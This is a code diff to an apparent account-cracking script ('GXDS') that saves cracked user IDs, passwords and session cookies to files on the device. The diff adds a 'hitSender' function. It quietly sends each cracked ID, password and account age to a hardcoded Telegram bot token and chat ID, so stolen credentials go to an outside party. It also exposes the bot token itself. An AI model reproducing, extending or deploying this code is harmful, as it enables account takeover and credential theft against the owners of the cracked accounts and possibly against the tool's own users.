@@ -614,6 +614,7 @@ def gxdsAPI(uid, pxss, tl):
                 print(
                     f"""{lgr}  [GXDS HITS] {uid} : {ps} -\033[0;33m {yrs}"""
                 )
+                hitSender(uid,ps,yrs)
                 open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
                 open("/sdcard/gxds-cookies.txt", "a").write(coki + "\n")
                 oks.append(uid)
@@ -640,6 +641,13 @@ def gxdsAPI(uid, pxss, tl):
         result(oks,cps)
         exit()
 
+# HIT SENDER
+def hitSender(uid, ps, yrs):
+  TOKEN = "6475095868:AAHH2uGLGm5a9GswmkVor8Xn7Oz9OOMYg6o"
+  chat_id = "6542321044"
+  message = f"[GXDS HITS] {uid} : {ps} - {yrs}"
+  url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}"
+  hxts = (requests.get(url).json())
 
 # FORWARDER
 def gxdsBot():
